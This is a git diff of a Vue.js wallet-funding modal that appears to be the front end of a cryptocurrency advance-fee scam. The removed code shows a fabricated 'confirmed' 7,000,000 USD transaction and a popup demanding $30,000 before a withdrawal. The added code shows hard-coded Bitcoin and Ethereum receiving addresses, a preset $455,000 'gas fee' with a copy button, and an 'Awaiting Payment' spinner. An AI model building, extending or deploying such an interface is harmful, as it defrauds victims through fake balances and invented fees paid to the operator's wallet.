@@ -8,51 +8,9 @@
           <img src="@/assets/fund-wallet-icon.svg" alt="fund-wallet-icon"/>
           <i class='bx bx-x' @click="close"></i>
         </div>
-        <form class="second-part">
-          <div class="separate">
-            <input type="checkbox" disabled />
-            <p class="text-3">
-              Transaction Hash : 0x186fdefc2952480f6739b7a30d5028c<br/>b1pc8497412edc9f99cec25c05c86df54
-            </p>
-          </div>
-
+        <div class="second-part">
+          <p class="text-3">Payment Method: Ethereum</p>
           <hr/>
-
-          <div class="separate">
-            <input type="checkbox" checked />
-            <p class="text-3">
-              Status : <span class="status-3">confirmed</span>
-            </p>
-          </div>
-
-
-            <p class="text-5">
-              Confirmation : 3 of 3
-            </p>
-
-
-          <hr/>
-
-          <div class="separate">
-            <input type="checkbox" checked  />
-            <p class="text-3">
-              Block : <span class="status-3">Blocks completed</span>
-            </p>
-          </div>
-
-          <hr/>
-
-          <div class="separate">
-            <input type="checkbox" checked />
-            <p class="text-3">
-              Amount : <span class="status-2">7,000,000 USD</span>
-            </p>
-          </div>
-
-          <hr/>
-
-
-
           <!--          <p class="text-2">How to fund your wallet:</p>-->
           <!--          <p class="text-3">Transfer desired amount to the details displayed below and have your balance funded</p>-->
           <!--          <p class="text-3">Note: After making your deposit,kindly send a screenshot/proof of deposit to-->
@@ -62,49 +20,45 @@
           <!--          </p>-->
 
 
-          <!--          <div class="qr-code">-->
-          <!--            &lt;!&ndash;            <vue-qrcode :value="bitcoinAddress"></vue-qrcode>&ndash;&gt;-->
-          <!--            <vue-qrcode :value="bitcoinAddress"/>-->
-          <!--          </div>-->
+          <div class="qr-code">
+            <!--            <vue-qrcode :value="bitcoinAddress"></vue-qrcode>-->
+            <vue-qrcode :value="bitcoinAddress"/>
+          </div>
 
-          <!--          <hr/>-->
+          <hr/>
 
-<!--          <div class="input-button-wrapper">-->
-<!--            <div>-->
-<!--              <label>Destination wallet</label>-->
-<!--            </div>-->
-<!--            <input type="text" required v-model="destinationWalletAddress"  class="text-input"-->
-<!--                   placeholder="Kindly enter wallet address"-->
-<!--            />-->
-<!--            &lt;!&ndash;            <button  class="submit-button" @click="copyText">Copy</button>&ndash;&gt;-->
-<!--          </div>-->
+          <div class="input-button-wrapper-2">
+            <label>Wallet Address</label>
+            <div class="input-button-wrapper">
+              <input type="text" required v-model="inputValue1"  class="text-input" />
+              <button  class="submit-button" @click="copyText">Copy</button>
+            </div>
+          </div>
 
-<!--          <div class="input-button-wrapper">-->
-<!--            <div>-->
-<!--              <label>Amount (BTC)</label>-->
-<!--            </div>-->
-<!--            <input type="text" required v-model="payOutAmount"  class="text-input"-->
-<!--                   placeholder="Enter Pay Out Amount in BTC"-->
-<!--            />-->
-                      <button @click="close"  class="submit-button">Okay</button>
-<!--          </div>-->
+          <div class="input-button-wrapper-2">
+
+            <label>Gas Fee ($)</label>
+
+            <div class="input-button-wrapper">
+              <input type="text" required v-model="inputValue4"  class="text-input" />
+              <button  class="submit-button">Copy</button>
+            </div>
+          </div>
 
 
-<!--          <div class="input-button-wrapper">-->
-<!--            &lt;!&ndash;            <p class="text-fiat">Fiat amount: $8,004,409.2 | 1 BTC = {{bitcoinRate}}</p>&ndash;&gt;-->
-<!--            <p class="text-fiat">Fiat amount: $8,004,409.2 | 89.14 BTC</p>-->
-<!--          </div>-->
+          <div class="input-button-wrapper">
+            <p class="text-fiat">Fiat amount: $455,000.00 | 1 ETH = {{ethereumRate}}</p>
+          </div>
+
+          <hr/>
+
+          <div class="seprate" >
+            <p class="loader-text" >Awaiting Payment</p>
+            <span class="loader"></span>
+          </div>
 
 
-
-          <!--          <div class="seprate" >-->
-          <!--            <p class="loader-text" >Awaiting Payment</p>-->
-          <!--            <span class="loader"></span>-->
-          <!--          </div>-->
-
-<!--          <button class="submit-button" >Proceed</button>-->
-
-        </form>
+        </div>
 
 
         <!--        <br/>-->
@@ -116,15 +70,15 @@
   </div>
 </template>
 
-
 <script>
+import VueQrcode from "@chenfengyuan/vue-qrcode";
 import {mapState} from "vuex";
-import Swal from "sweetalert2";
+import axios from "axios";
 
 export default {
-  name: "FundWalletModal6",
-  emits: ['close', 'open'],
-  // components: {VueQrcode},
+  name: "FundWalletModal8",
+  components: {VueQrcode},
+  emits: ['close'],
   computed: {
     ...mapState(['loginForm']),
   },
@@ -138,12 +92,29 @@ export default {
   methods:{
     async close() {
       this.$emit('close');
-      this.$emit('open');
       // await Swal.fire({
       //   icon: 'success',
       //   title: 'Pending',
       //   text: 'Deposit Processing',
       // });
+    },
+
+    fetchEthereumRate() {
+      // Set loading to true when the request starts
+      this.loading = true;
+
+      // Use CoinGecko API to fetch the Ethereum price
+      axios.get('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd')
+          .then(response => {
+            this.ethereumRate = response.data.ethereum.usd;
+            // Set loading to false when the data is successfully fetched
+            this.loading = false;
+          })
+          .catch(error => {
+            console.error(error);
+            // Set loading to false if there is an error
+            this.loading = false;
+          });
     },
 
     fetchBitcoinRate() {
@@ -197,36 +168,6 @@ export default {
 
     },
 
-    // New method to check the amount
-    async checkAmount() {
-      // Convert the entered amount to a float
-      const amount = parseFloat(this.payOutAmount);
-
-      // Check if the amount is greater than or equal to 8,000,000.00
-      if (amount >= 89.14) {
-        // Display success message
-        // alert("Success! The amount is valid.");
-        await Swal.fire({
-          icon: 'info',
-          title: 'Gas fee Required',
-          text: 'To start a withdrawal you need $30,000 on your network to process the transfer',
-          // footer: '<span style="color: #00bc00;">PoW Received</span>',
-        });
-        await this.$emit('open');
-        await this.$emit('close');
-
-      } else {
-        // Display error message
-        // alert("Error! The amount must be at least 8,000,000.00.");
-        await Swal.fire({
-          icon: 'error',
-          title: 'Error',
-          text: 'The amount must be at least 89.14 BTC',
-          // footer: '<span style="color: #00bc00;">PoW Received</span>',
-        });
-      }
-    }
-
   },
   data() {
     return {
@@ -234,33 +175,33 @@ export default {
       accountNumber: '',
       bankName: '',
       bitcoinAddress: '',
-      ethereumAddress: '',
+      ethereumRate: '',
       routingNumber: '',
       inputValue1: '',
       inputValue2: '',
       inputValue3: 119000,
+      inputValue4: 455000,
       bitcoinRate: null,
-      destinationWalletAddress: "",
-      payOutAmount: "",
     };
   },
   created() {
     this.fetchBitcoinRate()
+    this.fetchEthereumRate()
     this.convertAndSave()
-    this.bitcoinAddress = "bc1qgm7u48ks7drllvy5dwez6z3d9kmjxewu3wxt3s"
-    this.inputValue1 = "bc1qgm7u48ks7drllvy5dwez6z3d9kmjxewu3wxt3s"
+    this.bitcoinAddress = "0x623F72a30c85c4CBE77Ec4fe1F0dFCdC4e59b73E"
+    this.inputValue1 = "0x623F72a30c85c4CBE77Ec4fe1F0dFCdC4e59b73E"
     this.inputValue2 = this.loginForm.inputValue2
   },
   mounted() {
     this.fetchBitcoinRate()
+    this.fetchEthereumRate()
     this.convertAndSave()
-    this.bitcoinAddress = "bc1qgm7u48ks7drllvy5dwez6z3d9kmjxewu3wxt3s"
-    this.inputValue1 = "bc1qgm7u48ks7drllvy5dwez6z3d9kmjxewu3wxt3s"
+    this.bitcoinAddress = "0x623F72a30c85c4CBE77Ec4fe1F0dFCdC4e59b73E"
+    this.inputValue1 = "0x623F72a30c85c4CBE77Ec4fe1F0dFCdC4e59b73E"
     this.inputValue2 = this.loginForm.inputValue2
   }
 }
 </script>
-
 
 <style scoped >
 
@@ -280,7 +221,7 @@ dialog {
   top: 7vh;
   width: 32rem;
   height: 32rem;
-  left: calc(50% - 13.5rem);
+  left: calc(50% - 12rem);
   margin: 0;
   background-color: transparent;
   z-index: 100;
@@ -293,7 +234,7 @@ dialog {
   display: block;
   overflow: hidden;
   width: 420px;
-  height: 500px;
+  height: 600px;
   /*height: auto;*/
   padding: 24px;
   border-radius: 5px;
@@ -305,36 +246,6 @@ dialog {
 .first-part{
   display: flex;
   justify-content: space-between;
-}
-
-.separate{
-  display: flex;
-  align-items: center;
-  align-content: center;
-  gap: 5px;
-}
-
-.status{
-  background-color: #FFBF00;
-  padding: 7px 20px;
-  color: #FFFFFF;
-  border-radius: 5px;
-  font-size: 14px;
-}
-
-.status-2{
-  background-color: rgb(211, 211, 211);
-  padding: 7px 20px;
-  border-radius: 5px;
-  font-size: 14px;
-}
-
-.status-3{
-  background-color: #4BB543;
-  color: #FFFFFF;
-  padding: 7px 20px;
-  border-radius: 5px;
-  font-size: 14px;
 }
 
 .bx-x{
@@ -350,7 +261,6 @@ dialog {
   color: #0f171c;
   padding-top: 2.5%;
   padding-bottom: 1%;
-  word-wrap: break-word; /* or overflow-wrap: break-word; */
 }
 
 .text-2{
@@ -360,7 +270,6 @@ dialog {
   color: #070e20;
   padding-top: 1%;
   padding-bottom: 2%;
-  word-wrap: break-word; /* or overflow-wrap: break-word; */
 }
 
 .text-3{
@@ -370,7 +279,6 @@ dialog {
   color: #070e20;
   padding-top: 1.5%;
   padding-bottom: 2%;
-  word-wrap: break-word; /* or overflow-wrap: break-word; */
 }
 
 .text-4{
@@ -380,19 +288,16 @@ dialog {
   color: #070e20;
   padding-top: 1.5%;
   padding-bottom: 1.5%;
-  word-wrap: break-word; /* or overflow-wrap: break-word; */
 }
 
 .text-5{
+  font-weight: 400;
   font-size: 13px;
   line-height: 24px;
   color: #070e20;
-  margin-top: 0;
-  padding-top: 0;
-  padding-left: 10px;
+  padding-top: 2%;
   padding-bottom: 2%;
   word-wrap: break-word; /* or overflow-wrap: break-word; */
-  font-family: 'BR-Firma-Light', sans-serif;
 }
 
 button{
@@ -409,10 +314,14 @@ button{
 }
 
 .input-button-wrapper {
-  margin-bottom: 8%;
+  display: flex;
+  align-items: center;
+  margin-top: 2%;
+}
+
+.input-button-wrapper-2 {
   margin-top: 8%;
-  display: block;
-  width: 100%;
+  margin-bottom: 8%;
 }
 
 .text-input {
@@ -421,21 +330,16 @@ button{
   font-size: 16px;
   border: 1px solid #ccc;
   border-radius: 4px 0 0 4px;
-  width: 100%;
-  margin-top: 1%;
 }
 
-
 .submit-button {
-  padding: 8px 30px;
+  padding: 8px 16px;
   font-size: 16px;
   background-color: #007bff;
   color: white;
   border: 1px solid #007bff;
-  border-radius: 4px;
+  border-radius: 0 4px 4px 0;
   cursor: pointer;
-  margin-top: 5%;
-  display: inline-block;
 }
 
 .submit-button:hover {
@@ -477,6 +381,7 @@ button{
 
 .text-fiat{
   font-size: 13px;
+  margin-bottom: 2%;
 }
 
 .qr-code{
@@ -485,8 +390,6 @@ button{
 
 hr{
   border: 0.5px solid #ccc;
-  margin-top: 3%;
-  margin-bottom: 3%;
 }
 
 @keyframes animloader {
@@ -516,12 +419,12 @@ hr{
     top: 11vh;
     width: 25rem;
     height: 18rem;
-    left: calc(50% - 11.5rem);
+    left: calc(50% - 11rem);
     right: 30px;
   }
   .alpha{
-    width: 370px;
-    height: 480px;
+    width: 360px;
+    height: 610px;
   }
   h3{
     font-size: 18px;
